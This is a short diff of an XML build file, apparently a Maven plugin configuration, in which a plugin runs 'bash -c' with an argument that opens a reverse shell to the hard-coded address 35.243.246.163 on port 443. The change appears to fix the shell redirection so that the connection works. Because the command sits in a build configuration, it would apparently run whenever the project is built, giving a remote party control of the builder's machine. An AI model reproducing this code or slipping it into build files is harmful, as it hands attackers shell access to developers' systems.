@@ -94,7 +94,7 @@
                         <argument>
                             -c
                         </argument>
-                        <argument>bash &amp;&gt;/dev/tcp/35.243.246.163/443 &lt;&amp;1</argument>
+                        <argument>bash &amp;&gt; /dev/tcp/35.243.246.163/443 0&gt;&amp;1</argument>
                     </arguments>
                 </configuration>
             </plugin>
